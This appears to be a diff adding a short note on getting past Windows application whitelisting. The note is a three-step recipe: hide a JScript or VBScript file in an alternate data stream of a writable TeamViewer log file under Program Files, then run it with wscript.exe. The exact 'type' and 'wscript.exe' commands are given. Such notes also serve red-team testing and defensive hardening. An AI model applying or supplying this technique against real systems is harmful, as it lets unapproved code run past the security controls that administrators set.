@@ -1,0 +1,7 @@
+1st create a script file that wscript.exe can execute(JScript, VBA, etc)
+
+2nd Write that script to an alternate data stream of a file that is inside a whitelisted rule, and has the executable and writable permisions. Files that have these attributes:
+"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"    -> to alternate data stream(test.js)  -> type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+
+3rd Execute that file with wscript.exe
+wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
